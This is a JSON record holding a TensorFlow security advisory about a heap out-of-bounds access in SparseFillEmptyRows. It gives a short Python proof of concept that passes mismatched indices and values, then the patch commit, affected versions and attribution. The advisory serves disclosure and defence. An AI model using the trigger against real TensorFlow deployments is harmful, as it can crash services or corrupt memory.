{"description": "### Impact\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L194-L241) of `SparseFillEmptyRows` can be made to trigger a heap OOB access:\n\n```python\nimport tensorflow as tf\n  \ndata=tf.raw_ops.SparseFillEmptyRows(\n  indices=[[0,0],[0,0],[0,0]],\n  values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],\n  dense_shape=[5,3],\n  default_value='o')\n```\n  \nThis occurs whenever the size of `indices` does not match the size of `values`.\n\n### Patches\nWe have patched the issue in GitHub commit [67bfd9feeecfb3c61d80f0e46d89c170fbee682b](https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.", "methods": ["Heap OOB access triggered by mismatched indices and values in SparseFillEmptyRows.", "Use of GitHub for patching and versioning (TensorFlow 2.7.0, 2.6.1, 2.5.2, 2.4.4).", "Use of a security guide for more information (https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md).", "Attribution to Aivul Team from Qihoo 360 for reporting the vulnerability."]}
